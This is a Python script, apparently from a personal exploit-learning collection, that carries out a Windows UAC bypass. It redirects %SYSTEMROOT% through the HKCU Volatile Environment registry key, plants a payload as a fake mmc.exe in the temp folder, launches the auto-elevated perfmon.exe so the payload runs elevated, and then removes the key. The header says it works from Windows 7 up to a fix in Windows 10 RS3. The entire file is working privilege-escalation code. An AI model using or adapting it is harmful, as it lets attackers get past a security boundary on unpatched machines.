"""
Works from: Windows 7
Fixed in: Windows 10 RS3 (16299)
"""
import os
import time
import shutil
import winreg
import tempfile

def perfmon(payload):
	print("Payload: {}")
	print("Attempting to change %systemroot% through volatile environment")
	try:
		key= winreg.CreateKey(winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))
		winreg.SetValueEx(key,"SYSTEMROOT",0,winreg.REG_SZ,tempfile.gettempdir())
		winreg.CloseKey(key)
	except Exception as error:
		print("Unable to create %systemroot% key")
	else:
		print("Registry %systemroot% key was created")
	try:
		if ((os.path.exists(os.path.join(tempfile.gettempdir(),"system32"))) == True):
			if ((os.path.isfile(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))) == True):
				try:
					os.remove(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
				except Exception as error:
					return False
				try:
					os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
				except Exception as error:
					return False
			else:
				try:
					os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
				except Exception as error:
					return False
		else:
			pass
	except Exception as error:
		return False

	try:
		os.makedirs(os.path.join(tempfile.gettempdir(),"system32"))
	except Exception as error:
		print("Unable to create folder")
		return False
	else:
		print("Successfully created temp directory")
	
	print("Pausing for 5 seconds before copy")
	time.sleep(5)

	try:
		shutil.copy(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
	except shutil.Error as error:
		print("Unable to copy: {}".format(payload))
	except IOError as error:
		print("Unable to copy: {}".format(payload))
		return False
	else:
		print("Successfully copied: {} to: {}".format(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe")))

	print("Pausing for 5 seconds before executing")
	time.sleep(5)

	print("Attempting to create process")
	try:		
		if (os.system("perfmon.exe") == 0):
			print("Process started successfully")
		else:
			print("Problem creating process")
			return False
	except Exception as error:
		print("Problem creating process: {}".format(error))
		return False

	print("Pausing for 5 seconds before cleaning")	
	time.sleep(5)

	print("Attempting to remove %systemroot% registry key")	
	try:
		key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))
		winreg.DeleteValue(key,"SYSTEMROOT")
	except Exception as error:
		print("Unable to delete %systemroot% registry key")
		return False
	else:
		print("Registry %systemroot% key was deleted")

payload="C:\\Users\\vipul\\Desktop\\learning\\winpawnpython3\\payloads\\MessageBox.exe"
perfmon(payload)
